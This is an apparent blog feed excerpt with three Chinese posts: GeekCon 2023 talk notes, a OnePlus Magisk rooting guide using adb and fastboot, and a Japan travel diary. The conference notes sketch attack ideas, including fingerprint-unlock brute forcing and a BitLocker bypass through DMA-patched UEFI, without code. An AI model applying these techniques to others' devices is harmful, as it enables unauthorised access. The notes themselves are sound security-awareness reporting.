&lt;p&gt;往里稍微走一走就到大阪城周边了，应该说大阪城分三个部分，一个是最中心最高的天守阁，一个是周围护城河和墙围起来的日本风的环境，再外面是像现代公园的一个环境。进大阪城要过一个城门一样的东西。&lt;/p&gt;</summary>
    
    
    
    
    <category term="日常" scheme="https://ihopenot.github.io/tags/%E6%97%A5%E5%B8%B8/"/>
    
  </entry>
  
  <entry>
    <title>GeekCon2023</title>
    <link href="https://ihopenot.github.io/2023/10/30/GeekCon2023/"/>
    <id>https://ihopenot.github.io/2023/10/30/GeekCon2023/</id>
    <published>2023-10-30T03:22:03.000Z</published>
    <updated>2023-10-30T07:50:02.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="序"><a href="#序" class="headerlink" title="序"></a>序</h1><p>同学告诉今年GeenCon要开了，看了下感觉东西还行，正好本科同学也要上去做presentation，就想过去玩玩，顺便聚一下。</p><p>工作日抽时间去，所以火车定的比较紧，前一天晚上才到，后一天早上就走。在去的火车上发现正好明日方舟这几天在摆一个线下展，在美罗城那边，正好可以去看看。</p><span id="more"></span><h1 id="GeekCon"><a href="#GeekCon" class="headerlink" title="GeekCon"></a>GeekCon</h1><p>据说有小礼品，早上一早就过去了，然后发现有个集章活动，去的早，摆摊的人都还没来齐。进去先在华为那薅了个万能魔方，然后四处晃。</p><p>baidu那里的展台在焊板子，但是早上一直没开，之后又一直在听会，就中场的时候去看了下。</p><p>之后陆陆续续展台都开起来，集章集完了去兑换奖品，发现就是一瓶可乐（。补给处那个大妈还是个外国人，相当友善，热情。</p><p>之后不一会会就正式开始了。</p><h2 id="DAF"><a href="#DAF" class="headerlink" title="DAF"></a>DAF</h2><p>这个环节基本就是演示，没有原理啥的，不太清楚。</p><h3 id="致命脉冲"><a href="#致命脉冲" class="headerlink" title="致命脉冲"></a>致命脉冲</h3><p>通过DNS反射放大做DoS，说是不依赖DNS的具体实现，有点好奇，总不能是DNS协议的问题吧？据说可以放大万倍。</p><h3 id="无限手套"><a href="#无限手套" class="headerlink" title="无限手套"></a>无限手套</h3><p>这个还有点意思，这个是之前blackhat的会上讲过的，主要是因为手机指纹解锁的逻辑漏洞导致的。大前提是指纹的抗碰撞性并不好，大概10000人就会有一个人能打开你的手机。然后为了鲁棒性，手机一次指纹解锁会采集多次指纹，只要有一次匹配就能打开。最后最关键的是，正常手机指纹解锁多次会累计一个失败计数器，达到阈值之后会把指纹解锁锁定，但是指纹解锁有个Error状态，只要这次指纹触发了Error，就不会累计失败计数器，所以可以通过多个指纹+Error注入+侧信道来爆破指纹，解锁。</p><h3 id="日车"><a href="#日车" class="headerlink" title="日车"></a>日车</h3><p>日车的有好几个，感觉都差不多就放一块了。看起来很nb，但是反正就是过去，把车门开了。还有一个可以把车直接开走。但是本身啥也没说，就演示一下，感觉没啥意思。把车开走那个前几次出了点问题，看起来像是通过抓wifi信号获取什么密钥然后把车日了的。</p><h3 id="消逝的声波"><a href="#消逝的声波" class="headerlink" title="消逝的声波"></a>消逝的声波</h3><p>没啥意思，就是一个超声波的静默装置，干扰录音用的。定向的，而且效果也不是很好，感觉。</p><h3 id="穿越"><a href="#穿越" class="headerlink" title="穿越"></a>穿越</h3><p>虚拟机逃逸，一个HyperV的穿出去任意代码执行，一个mac上的PD，好像是，穿出去任意文件读写。</p><h2 id="15-5"><a href="#15-5" class="headerlink" title="15+5"></a>15+5</h2><h3 id="URB之剑"><a href="#URB之剑" class="headerlink" title="URB之剑"></a>URB之剑</h3><p>VMware Fusion逃逸，主要是ehci的实现漏洞。主要是urb的处理不当，然后提供了一些位于urb部分和svga的一些原语。</p><img data-src='/2023/10/30/GeekCon2023//IMG20231024111546.jpg'  alt="IMG20231024111546" style="zoom:10%;" /><h3 id="曝光7年的攻击手段再现"><a href="#曝光7年的攻击手段再现" class="headerlink" title="曝光7年的攻击手段再现"></a>曝光7年的攻击手段再现</h3><p>解bitlocker，只能解系统盘的bitlocker，原理是因为系统盘的bitlocker加密只与硬件状态相关，和用户密码无关，因为系统加载的时候不需要用户输入密码。</p><img data-src='/2023/10/30/GeekCon2023//IMG20231024155534.jpg'  alt="IMG20231024155534" style="zoom:10%;" /><p>所以理论上肯定可以解，但是由于硬件security boot的保护进不去系统。试图DMA直接写内核来绕过登录，但是内核开了DMA写保护，无法直接修改。然后通过在boot的时候用DMA修改UEFI来关闭内核DMA写保护来日内核，然后绕过登录，进去就能看到解密之后的硬盘了。</p><img data-src='/2023/10/30/GeekCon2023//IMG20231024160000.jpg'  alt="IMG20231024160000" style="zoom:10%;" /><img data-src='/2023/10/30/GeekCon2023//IMG20231024160135.jpg'  alt="IMG20231024160135" style="zoom:10%;" /><h3 id="Pwn-Everything-with-Electron"><a href="#Pwn-Everything-with-Electron" class="headerlink" title="Pwn Everything with Electron"></a>Pwn Everything with Electron</h3><p>这个当时主讲没了，所以换成了另外的Android和IOS的一些漫谈。</p><h3 id="Attacking-the-Pixel-Modem-Over-The-Air"><a href="#Attacking-the-Pixel-Modem-Over-The-Air" class="headerlink" title="Attacking the Pixel Modem Over The Air"></a>Attacking the Pixel Modem Over The Air</h3><p>远程打基带，通过fuzz找三星基带的洞日的。</p><h3 id="办公文档中的隐藏威胁"><a href="#办公文档中的隐藏威胁" class="headerlink" title="办公文档中的隐藏威胁"></a>办公文档中的隐藏威胁</h3><p>主要是docx加载object的问题。</p><img data-src='/2023/10/30/GeekCon2023//IMG20231024170917.jpg'  alt="IMG20231024170917" style="zoom:10%;" /><p>使用不常用的格式和软件可能更容易exploit。</p><img data-src='/2023/10/30/GeekCon2023//IMG20231024171610.jpg'  alt="IMG20231024171610" style="zoom:10%;" /><img data-src='/2023/10/30/GeekCon2023//IMG20231024171648.jpg'  alt="IMG20231024171648" style="zoom:10%;" /><h2 id="披露"><a href="#披露" class="headerlink" title="披露"></a>披露</h2><p>披露基本都是手机相关的，主要都是SDK干坏事，一个是互相唤醒，一个是利用广告获利，还有一个是手机本机号码一键登录的漏洞。</p><p>大概就是一个是恶意sdk，然后厂商可以通过给sdk交保护费的方式让sdk去唤醒自家的app，这就是为啥明明后台没有起相应的app，却一直在给你推送消息的原因。</p><p>然后另一个是一键登录实现的有问题，让恶意app能利用你的手机一键登录别的app，然后做些坏事。</p><p>还有一个环节是GPT，这个感觉有点意思，上面一共展示了3种GPT的用法，一个是日志分析，用来捕获网上的攻击流量。第二个是代码漏洞检测和修复建议。最后一个是通过GPT来生成harness辅助Fuzz。都是利用到了GPT处理语义化的信息，感觉这个算是GPT的一个主要方向，其实GPT现在体现出来的语言理解能力，它可以处理很多类型的问题，很多东西其实可以抽象成一种语言，比如汇编，比如代码，只不过相对汇编，代码，自然语言一个比一个更重逻辑。</p><h1 id="舟线下展"><a href="#舟线下展" class="headerlink" title="舟线下展"></a>舟线下展</h1><p>会开完了就和同学聚餐，正好舟在办线下展，直奔徐家汇。</p><p>图图姐。</p><img data-src='/2023/10/30/GeekCon2023//IMG20231024184228.jpg'  alt="IMG20231024184228" style="zoom:10%;" /><p>吃完之后去外滩逛了下，可惜看到东方明珠的时候已经到熄灯时间了。</p><img data-src='/2023/10/30/GeekCon2023//IMG20231024220410.jpg'  alt="IMG20231024220410" style="zoom:10%;" /><p>收获颇丰。</p><img data-src='/2023/10/30/GeekCon2023//IMG20231024235057.jpg'  alt="IMG20231024235057" style="zoom:10%;" />]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;序&quot;&gt;&lt;a href=&quot;#序&quot; class=&quot;headerlink&quot; title=&quot;序&quot;&gt;&lt;/a&gt;序&lt;/h1&gt;&lt;p&gt;同学告诉今年GeenCon要开了，看了下感觉东西还行，正好本科同学也要上去做presentation，就想过去玩玩，顺便聚一下。&lt;/p&gt;
&lt;p&gt;工作日抽时间去，所以火车定的比较紧，前一天晚上才到，后一天早上就走。在去的火车上发现正好明日方舟这几天在摆一个线下展，在美罗城那边，正好可以去看看。&lt;/p&gt;</summary>
    
    
    
    
    <category term="日常" scheme="https://ihopenot.github.io/tags/%E6%97%A5%E5%B8%B8/"/>
    
  </entry>
  
  <entry>
    <title>OnePlus刷Magisk</title>
    <link href="https://ihopenot.github.io/2023/09/24/OnePlus%E5%88%B7Magisk/"/>
    <id>https://ihopenot.github.io/2023/09/24/OnePlus%E5%88%B7Magisk/</id>
    <published>2023-09-24T07:03:40.000Z</published>
    <updated>2023-09-24T08:27:30.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>两年多前搞了个一加9的手机，就是冲着可以解锁oem刷机去的，然后到手就给刷了氧os+magisk，当时理解比较粗浅，不知道咋更新系统，以为每次更新都要重刷magisk太麻烦了就很久没更新。</p><p>后来想着一直不更新也不是个事，然后开始研究怎么更新系统同时保留magisk，这里总结一下流程和坑。</p><p>TLDR：只是OnePlus的流程，别的厂商的手机过程可能略有不同。</p><ol start="0"><li>如果没有解锁bootloader，跳转到<code>google搜索如何解锁bootloader</code></li><li>如果有对应系统的boot.img，通常在全量包中可以找到，跳转到3。</li><li>如果没有boot.img，搜索如何刷入全量包，并刷入一个网上现有的全量包，同时从全量包中提取boot.img。</li><li>将boot.img上传到手机内。</li><li>如果有magisk app，跳转到6。</li><li>如果没有magisk app，安装一个，安装包在<a href="https://github.com/topjohnwu/Magisk/releases">github</a>下载。</li><li>使用magisk app，安装，选择并修补一个文件，选择之前上传的boot.img。</li><li>将magisk修补完成的文件拷贝到电脑上。</li><li>使用<code>adb reboot bootloader</code>进入fastboot。</li><li>使用<code>fastboot boot magisk_patch_xxxxx_xxxxx.img</code>进入临时的magisk环境。</li><li>在magisk app里，安装，直接安装，重启。</li><li>成功。</li></ol><p>下面是小故事。</p><span id="more"></span><h1 id="更新系统"><a href="#更新系统" class="headerlink" title="更新系统"></a>更新系统</h1><p>搜了下发现magisk有个patch OTA的功能，原理是因为现在android系统大部分都是双槽位的，平时系统启动正常运行在一个槽位，如果有更新的话，系统会把更新应用到另一个未启用的槽位，然后在机器下一次重启的时候切换到另一个槽位启动，完成系统更新。</p><p>然后magisk会在系统更新完成另一个槽位之后，将另一个槽位里的操作系统修改了，这样重启之后的新系统也有magisk。但是这里要注意，在系统更新完成之后，一定要先用magisk patch OTA修改另一个槽位再重启，不然手贱先重启了，那magisk就丢了，重刷吧。</p><p>然后用这个方法一路更新，畅通无阻，直到到了某一个系统版本。</p><p>系统更新失败了。。不知道为啥，感觉是magisk给系统搞烂了，等magisk更新吧。</p><p>然后等magisk更新，前几天发现更新了点小版本，然后又试着更新了下系统，然后还是失败。然后想着别人应该也有类似问题吧，搜一下。</p><p>然后发现magisk的uninstall里有个恢复原厂镜像的功能，这个功能会把另一个槽位换回原版的系统，切换回来之后系统就能正常更新了。</p><p>然后又一路更新，直到某一个版本。之前的版本都是点击“安装更新”，系统会更新另一个槽位的文件，点击“重启”会reboot系统。这个版本开始，点击更新之后，下载更新，解压更新，到了这一步就是再更新另一个槽位的文件了。然后点击“安装更新”，就直接重启了。。。我还以为和之前系统一样，点了安装更新看它重启直接人傻了。</p><p>什么sb一加。</p><h1 id="重刷magisk"><a href="#重刷magisk" class="headerlink" title="重刷magisk"></a>重刷magisk</h1><p>算了，烂就烂了吧，搞不定只能重刷了。</p><p>然后凭借自己稀烂的记忆开始重刷，踩了不少坑，有几次都以为变砖了，这里记录一下，免得之后又忘了。</p><p>查下手册，先patch文件，找了下手机里有个之前老旧版本的安装包，用magisk修补文件，成了，没问题。</p><p>然后要进fastboot刷进去，试下<code>adb reboot fastboot</code>，嗯？怎么要我选语言，感觉和之前不太一样？fastboot devices也找不到设备。</p><p>然后xjb点点点还点进了9008模式，这是高通的深度刷机模式，fastboot没了也能救回来，但是当时不知道，手机黑了开也开不了，关也关不了，以为变砖了。后来搜到了这是9008模式，可以上高通救砖包救，误入的话可以音量键+电源键按住5s左右，会重新进入正常的启动流程。</p><p>然后发现<code>adb reboot fastboot</code>进的是fastbootd。是一个用户层的一个工具，并不是fastboot模式。进fastboot模式正确姿势是<code>adb reboot bootloader</code>。</p><p>然后fastboot还是找不到设备，后来想起来了，自己之前也遇到了这个问题，是因为windows的驱动问题，找了一下好像没有靠谱的驱动，没找到google官方的驱动，就没下了，转而是用的Linux虚拟机来刷机。</p><p>然后之前不是patch成功了一个文件吗，进fastboot给他刷上去试试。</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fastboot getvar current-slot</span><br><span class="line">fastboot flash boot[_x] magisk_patch_xxxx.img # _x是前一条命令返回的结果，需要刷在current active的槽里。</span><br><span class="line">fastboot reboot</span><br></pre></td></tr></table></figure><p>火速刷上，绝赞开不了机。</p><p>卡一屏了，开也开不了，关也关不了，fastboot也进不了了，又以为变砖了。因为关不了机所以进不了fastboot，一种解决方法是放到手机没电关机，再插电开机进fastboot。但是折腾一下发现音量加+电源键可以强制重启，然后在重启还没进一屏的时候快速按下音量减+电源键，成功进入fastboot。</p><p>吃一堑长一智，<strong>fastboot flash之前一定先用fastboot boot试一下</strong>，fastboot boot起不来只要重启系统还是好的，flash上去起不来就只能再进fastboot重刷了。</p><p>进了fastboot就安心了，然后想了想发现自己是sb，boot.img和自己手机当前系统完全不匹配，刷上去能跑才是奇迹。现在就需要一个我手机原版系统版本的boot.img，刷上去应该就能进系统了。然后搜了下发现一个神奇的网站，<a href="https://magiskcn.com/oneplus-magisk%EF%BC%8C%E9%87%8C%E9%9D%A2%E6%9C%89%E5%90%84%E4%B8%AA%E7%89%88%E6%9C%AC%E7%9A%84%E7%B3%BB%E7%BB%9F%E5%85%A8%E9%87%8F%E5%8D%87%E7%BA%A7%E5%8C%85%EF%BC%8C%E4%B9%8B%E5%89%8D%E8%BF%98%E5%9C%A8%E5%B0%9D%E8%AF%95%E6%8A%93%E5%8C%85%E4%BB%8E%E5%AE%98%E7%BD%91%E6%89%A3%E5%85%A8%E9%87%8F%E5%8D%87%E7%BA%A7%E5%8C%85%EF%BC%8C%E8%BF%99%E4%B8%8B%E6%96%B9%E4%BE%BF%E4%BA%86%E3%80%82">https://magiskcn.com/oneplus-magisk，里面有各个版本的系统全量升级包，之前还在尝试抓包从官网扣全量升级包，这下方便了。</a></p><p>根据记忆，刷之前的系统是升到了F.78的版本，然后直接找到对应的升级包，把payload.bin解压出来，用payload-dumper-go-64把boot.img解出来。fastboot刷上去，绝赞进入系统，之后就没啥说的了，adb把boot.img丢到手机里，magisk patch一下，fastboot重新刷上去。</p><p>然后再升级的发现magisk报错，提示备份不存在，搜了下，发现姿势不太对，应该是fastboot把原厂镜像刷回去，再用fastboot boot从patch之后的镜像启动，之后在临时的magisk环境里用magisk app，install选择直接安装。再重启就可以正常更新了。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;两年多前搞了个一加9的手机，就是冲着可以解锁oem刷机去的，然后到手就给刷了氧os+magisk，当时理解比较粗浅，不知道咋更新系统，以为每次更新都要重刷magisk太麻烦了就很久没更新。&lt;/p&gt;
&lt;p&gt;后来想着一直不更新也不是个事，然后开始研究怎么更新系统同时保留magisk，这里总结一下流程和坑。&lt;/p&gt;
&lt;p&gt;TLDR：只是OnePlus的流程，别的厂商的手机过程可能略有不同。&lt;/p&gt;
&lt;ol start=&quot;0&quot;&gt;
&lt;li&gt;如果没有解锁bootloader，跳转到&lt;code&gt;google搜索如何解锁bootloader&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;如果有对应系统的boot.img，通常在全量包中可以找到，跳转到3。&lt;/li&gt;
&lt;li&gt;如果没有boot.img，搜索如何刷入全量包，并刷入一个网上现有的全量包，同时从全量包中提取boot.img。&lt;/li&gt;
&lt;li&gt;将boot.img上传到手机内。&lt;/li&gt;
&lt;li&gt;如果有magisk app，跳转到6。&lt;/li&gt;
&lt;li&gt;如果没有magisk app，安装一个，安装包在&lt;a href=&quot;https://github.com/topjohnwu/Magisk/releases&quot;&gt;github&lt;/a&gt;下载。&lt;/li&gt;
&lt;li&gt;使用magisk app，安装，选择并修补一个文件，选择之前上传的boot.img。&lt;/li&gt;
&lt;li&gt;将magisk修补完成的文件拷贝到电脑上。&lt;/li&gt;
&lt;li&gt;使用&lt;code&gt;adb reboot bootloader&lt;/code&gt;进入fastboot。&lt;/li&gt;
&lt;li&gt;使用&lt;code&gt;fastboot boot magisk_patch_xxxxx_xxxxx.img&lt;/code&gt;进入临时的magisk环境。&lt;/li&gt;
&lt;li&gt;在magisk app里，安装，直接安装，重启。&lt;/li&gt;
&lt;li&gt;成功。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;下面是小故事。&lt;/p&gt;</summary>
    
    
    
    
    <category term="折腾" scheme="https://ihopenot.github.io/tags/%E6%8A%98%E8%85%BE/"/>
    
  </entry>
  
  <entry>
    <title>赴日游记(二)</title>
    <link href="https://ihopenot.github.io/2023/09/20/%E8%B5%B4%E6%97%A5%E6%B8%B8%E8%AE%B0-%E4%BA%8C/"/>
    <id>https://ihopenot.github.io/2023/09/20/%E8%B5%B4%E6%97%A5%E6%B8%B8%E8%AE%B0-%E4%BA%8C/</id>
    <published>2023-09-20T02:57:37.000Z</published>
    <updated>2023-10-25T02:03:26.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="日程"><a href="#日程" class="headerlink" title="日程"></a>日程</h1><h2 id="Day1"><a href="#Day1" class="headerlink" title="Day1"></a>Day1</h2><p>早上起床，桌子上是昨晚买的伊右卫门茶，和九点整的闹钟，然后拍了一张。</p><img data-src='/2023/09/20/赴日游记-二//IMG20230726090103.jpg'  alt="IMG20230726090103" style="zoom:10%;" /><p>今天起床就开始在看京都有啥玩的，大致决定的路线如下。</p><img data-src='/2023/09/20/赴日游记-二//image-20230920112400707.png'  alt="image-20230920112400707" style="zoom:50%;" /><p>先去罗森搞点早饭，拿了一个饭团一个饭卷，去找服务员加热，然后把饭团加热了，告诉我饭卷是寿司，不用加热。然后在店门口吃了，日本罗森店里很多都没有座位的，也不知道该在哪吃，边走边吃好像也不太好，就站在店门口吃完走了。</p><span id="more"></span><p>先去三年坂，在日本出行的话赶电车，公交啥的用google地图或者yahoo的换乘案内比较友好，日本特别注重守时，列车时刻表上的时间基本都是准时到达，以前好像还有电车早到还是迟到发了道歉声明的，对于时间安排比国内友好得多，但是遇见不可抗力还是会晚点，我们就遇上好像学园都市那边撞人了导致一整条线路晚点的情况。</p><p>公交的话在等公交的时候还搜了一下日本公交怎么坐，是前上还是后上，上车给钱还是下车给钱啥的，但是好像这个是跟具体公交运营方有关的，每个地方还不太一样，京都这里公交是后上前下，下车给钱，都是统一价格。然后如果下一站你要下车的话要按一下到站按钮，如果一个站没人下车的话司机就直接开过不停了。</p><p>然后去三年坂是坐的公交车，日本公交很不便宜，一次一两百日元，但是一般城市都会有旅游通票，京都这边有一日券，大阪也有旅行通票，京都一日券就是一天市营公交地铁一整天随便坐。然后我们一开始不知道有这个东西，是到平安神宫之后才去办的一日券，导致亏了早上的2，3趟公交的钱。</p><p>在三年坂附近下了车，直观感受就是全是人，人非常多，都是外地的游客。而且三年坂这附近很多和服店，提供租借和服的服务，偶尔能看到穿着和服的人。</p><p>这是某处上坡。</p><img data-src='/2023/09/20/赴日游记-二//DJI_20230726092726_0030_D.png'  alt="DJI_20230726092726_0030_D" style="zoom:10%;" /><p>这是标志性的三岔口，但是全是人。</p><img data-src='/2023/09/20/赴日游记-二//DJI_20230726093331_0035_D.png'  alt="DJI_20230726093331_0035_D" style="zoom:10%;" /><p>二年坂。</p><img data-src='/2023/09/20/赴日游记-二//DJI_20230726094013_0041_D.png'  alt="DJI_20230726094013_0041_D" style="zoom:10%;" /><p>之后本来以为要坐车去八坂神社的，结果走着走着就到了。</p><img data-src='/2023/09/20/赴日游记-二//IMG20230726105334.jpg'  alt="IMG20230726105334" style="zoom:10%;" /><p>里面有很大的奉纳箱，还有很多小神社，什么蛭子神社啥的。</p><img data-src='/2023/09/20/赴日游记-二//IMG20230726105509.jpg'  alt="IMG20230726105509" style="zoom:10%;" /><img data-src='/2023/09/20/赴日游记-二//IMG20230726110342.jpg'  alt="IMG20230726110342" style="zoom:10%;" /><p>然后这边走的时候感觉看到很多台湾来的人。</p><p>之后到平安神宫，也是坐公交去的，市内交通的话还是公交和地铁用的比较多。</p><p>这是神宫前面的大鸟居。</p><img data-src='/2023/09/20/赴日游记-二//IMG20230726114536.jpg'  alt="IMG20230726114536" style="zoom:10%;" /><p>神宫外景。</p><img data-src='/2023/09/20/赴日游记-二//IMG20230726115413.jpg'  alt="IMG20230726115413" style="zoom:10%;" /><p>神宫内景。</p><img data-src='/2023/09/20/赴日游记-二//IMG20230726115800.jpg'  alt="IMG20230726115800" style="zoom:10%;" /><p>神宫门口还看见巫女小姐姐了，除了这些宫殿，后面还有个神宫御苑，像花园一样的东西，但是要门票，就没去了。。。</p><p>出了神宫，这个时候已经到中午了，准备找点吃的，然后昨天晚上回来给卡冲的1000日元今天早上坐公交已经花的差不多了。然后准备找个地铁站充下卡，顺便吃点饭。</p><p>然后讨论公交贵的时候想有没有什么通票之类的，因为日本人如果是上下班上下学通勤的话也可以办理通勤券，相比直接坐会优惠很多，结果一搜还真有，正好附近地铁站可以办，然后在附近找了一家松屋吃的午饭，之后去办了个京都一日游的券，只要第一次把券插进机器里过一次，之后只要把日期出示给司机看就行了。</p><p>然后松屋吃的是咖喱，没拍。。。那个咖喱就是塑料袋里加热然后倒在饭上就上上来了。。感觉一般，也没有辣味，盐味倒是比较重。店内免费供应冰水，炎热的天气在店里休息，喝几杯冰水，吃完饭，太舒服了。又不得不说日本服务业真不错，不仅公交车上司机有礼貌，下车还会给你再见。店员也是敬语拉满，而且基本每家店都会供应冰水，大热天真的很需要这个。</p><p>之后去金阁寺，金阁寺也是个热门景点，人不少，还要门票钱，还是进去看了。感觉就一个大花园，然后一个金阁寺在那。寺是不让进的，所以也看不到天花板。只有绕着周围拍几张，而且还立了牌子，不准带三脚架去拍摄，说是不美观。以前日本好像寺庙和神社都不太欢迎拍照，有点不敬鬼神的感觉，但是现在好像放开了。</p><p>寺。</p><img data-src='/2023/09/20/赴日游记-二//IMG20230726152554.jpg'  alt="IMG20230726152554" style="zoom:10%;" /><p>然后也没啥别的了。</p><p>从寺出来天开始下雨了，之前和Y同学说晚上再在伏见那边聚餐的，但是雨下的有点大，又不知道去不去了，上面的路程已经完成，不知道是去伏见还是回酒店等雨。后来决定先坐到伏见看下，要是天气好转就直接去伏见稻荷大社，转到晚上吃饭。然后虽然雨势很大，但是等坐到伏见的时候已经完全放晴了，然后去伏见稻荷玩。</p><p>伏见稻荷大社就是著名的千本鸟居在的神社，一开始以为这个社就一个千本鸟居，估计也转不了太久，然后到了发现千本鸟居是真有一千根以上，整个从山脚到山顶全是鸟居。就结论来说我们爬山爬到天色泛黑，水都喝完了才爬了一半。。如果真想爬到顶估计得上午就过来。</p><p>伏见稻荷大社。</p><img data-src='/2023/09/20/赴日游记-二//IMG20230726170713.jpg'  alt="IMG20230726170713" style="zoom:10%;" /><p>观光指引，我们走到了熊鹰社那附近就折返了。</p><img data-src='/2023/09/20/赴日游记-二//IMG20230726171129.jpg'  alt="IMG20230726171129" style="zoom:10%;" /><p>千本鸟居，很难拍到没人的情况，这里正好后面有人拍照拦了一下才拍到的。</p><img data-src='/2023/09/20/赴日游记-二//IMG20230726172428.jpg'  alt="IMG20230726172428" style="zoom:10%;" /><p>然后一路上山，全是鸟居，还有大大小小的小神社，很多都是只是一个石龛，但是有很多这种石龛，而且每一个敬拜的神都不一样。拍糊了。。</p><img data-src='/2023/09/20/赴日游记-二//IMG20230726174058.jpg'  alt="IMG20230726174058" style="zoom:10%;" /><p>阴影中的鸟居。</p><img data-src='/2023/09/20/赴日游记-二//IMG20230726175304.jpg'  alt="IMG20230726175304" style="zoom:10%;" /><p>前有绝景。</p><img data-src='/2023/09/20/赴日游记-二//IMG20230726181303.jpg'  alt="IMG20230726181303" style="zoom:10%;" /><p>然后爬到这里就基本上弹尽粮绝了，看起来很短，但是这段路程爬了一个小时，一直在走。到这里已经是下午6点了。这几天每天都热的离谱，走到这水也喝完了，在考虑要不要下山了，然后又向上走了几步发现走了个死路，然后就直接折返下山了。</p><p>下山之后天色都黑了，直接去吃饭，和Y同学汇合之后去了一个阪急电车车站，路上还看到了一个踏切，之后坐阪急去的吃饭的地方。吃的饺子王将，也没拍照，有加大蒜的饺子，比不加蒜的好吃。还有麻婆豆腐，回锅肉。但是回锅肉是甜的。还有天津饭但是没点，亏了，这种只有日本才有的中国美食。吃饭的时候Y同学也告诉我们说在日本吃饭最好不要剩饭，是对厨师的不尊重，实在吃不完了也要说すみません。然后讲故事说好像有人吃完之后碗里剩了几颗饭，周围的人就说“这也算吃完了吗”。</p><p>之后吃完就坐地铁回去了，回去的路上看到二次元地铁。</p><img data-src='/2023/09/20/赴日游记-二//IMG20230726195215.jpg'  alt="IMG20230726195215" style="zoom:10%;" /><p>还有夜晚的京都塔。</p><img data-src='/2023/09/20/赴日游记-二//IMG20230726213956.jpg'  alt="IMG20230726213956" style="zoom:10%;" /><p>晚上回酒店看日本的电视，在放中国对日的水产品禁令。</p><img data-src='/2023/09/20/赴日游记-二//IMG20230726223659.jpg'  alt="IMG20230726223659" style="zoom:10%;" /><p>然后睡觉。</p><h2 id="Day2"><a href="#Day2" class="headerlink" title="Day2"></a>Day2</h2><p>今天从京都赶往大阪，电车的话路程并不长，早上起来先找饭吃，吃的是个松屋或者なつや吧忘了。</p><p>点菜的话用的是平板，直接在上面点好就行了，基本不用语言沟通，而且也支持多国语言，不得不说日本的旅游业确实很发达。点的是芝士牛盖饭，非常不错，而且配的凉麦茶和味增汤味道也不错。</p><img data-src='/2023/09/20/赴日游记-二//image-20231023164956751.png'  alt="image-20231023164956751" style="zoom:10%;" /><p>到中午是去京都站逛了下，京都站真的非常大，要迷路的感觉。然后去里面的伊藤园逛了下，除了吃的就是一些奇奇怪怪的小物件，没啥意思。然后发现最高层有一个飞机的停机坪，也不知道是什么人物会用到。</p><img data-src='/2023/09/20/赴日游记-二//image-20231023164437743.png'  alt="image-20231023164452614" style="zoom:10%;" /><p>之后有在里面乱逛了一会，火车站里面还有一些奇景，比如一个叫什么太阳广场的地方，上去之后啥也没有，然后又是夏天，巨热，在上面直接融化，但是还是有一些景色的。</p><img data-src='/2023/09/20/赴日游记-二//IMG20230727123446.jpg'  alt="IMG20230727123446" style="zoom:10%;" /><p>从上往下看的真正的京都站，这个是真正进火车的地方，逛的地方应该是配套设施。</p><img data-src='/2023/09/20/赴日游记-二//IMG20230727123301.jpg'  alt="IMG20230727123301" style="zoom:10%;" /><p>还有一些类似屋顶公园的地方，去的时候有个老哥在那里二次元歌曲钢琴连弹，还行。还有京都站的一个塑料模型，包括周边和整个京都站，还原度还挺高，做的挺精致的。这是从电梯上拍的景色。</p><img data-src='/2023/09/20/赴日游记-二//IMG20230727124707.jpg'  alt="IMG20230727124707" style="zoom:10%;" /><p>之后再晃了一下要去赶电车了，一路到大阪去，大阪和京都又是一番不同，电车上没啥好说的。到了大阪，先去酒店，酒店就在JR车站旁边，出车站直接就到了。去办入住手续，这个酒店比上一个高档些，然后它们的牙刷啊，洗发露之类的东西都是需要的时候再去大堂拿，不会每天帮你更新，这样会减少一些浪费吧。到了酒店，发现采光还可以，而且对面的房顶上还有个小神社，就像天气之子里面一样。</p><img data-src='/2023/09/20/赴日游记-二//IMG20230727152735.jpg'  alt="IMG20230727152735" style="zoom:10%;" /><p>到了之后一个下午不想动，然后在床上一直躺到晚上。晚上又不知道吃啥了，翻了一下推荐，发现来大阪不能不吃大阪烧，然后找了个看起来风评还不错的一家大阪烧。然后赶过去吃，到了之后发现这里是个类似小吃街的地方，里面形形色色有各种吃的，有啥蛋糕之类的，还有居酒屋。本来想试试居酒屋的，但是后来也没敢进去，然后去找目标的那家大阪烧，发现人还不少，还排着队。我点的是加海鲜的大阪烧，还有一份原味的大阪烧，外表看不出来啥区别（</p><img data-src='/2023/09/20/赴日游记-二//IMG20230727192928.jpg'  alt="IMG20230727192928" style="zoom:10%;" /><p>上面是一层美乃滋，最后吃完发现不是目标的那家大阪烧（，排队的时候就感觉有点不对了，但是排都排了，算了。味道还是不错的。</p><p>最后吃完去心斋桥，拍了个大阪跑男。</p><img data-src='/2023/09/20/赴日游记-二//image-20231025095829044.png'  alt="image-20231025095829044" style="zoom:10%;" /><p>之后往下走到日本桥，本来想逛逛二次元，结果去的太迟了，大部分店都已经关门了。就记得到处贴的二次元live广告，也不知道是啥游戏。</p><p>再之后就坐地铁回酒店了睡觉了。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;日程&quot;&gt;&lt;a href=&quot;#日程&quot; class=&quot;headerlink&quot; title=&quot;日程&quot;&gt;&lt;/a&gt;日程&lt;/h1&gt;&lt;h2 id=&quot;Day1&quot;&gt;&lt;a href=&quot;#Day1&quot; class=&quot;headerlink&quot; title=&quot;Day1&quot;&gt;&lt;/a&gt;Day1&lt;/h2&gt;&lt;p&gt;早上起床，桌子上是昨晚买的伊右卫门茶，和九点整的闹钟，然后拍了一张。&lt;/p&gt;
&lt;img data-src=&#39;/2023/09/20/赴日游记-二//IMG20230726090103.jpg&#39;  alt=&quot;IMG20230726090103&quot; style=&quot;zoom:10%;&quot; /&gt;

&lt;p&gt;今天起床就开始在看京都有啥玩的，大致决定的路线如下。&lt;/p&gt;
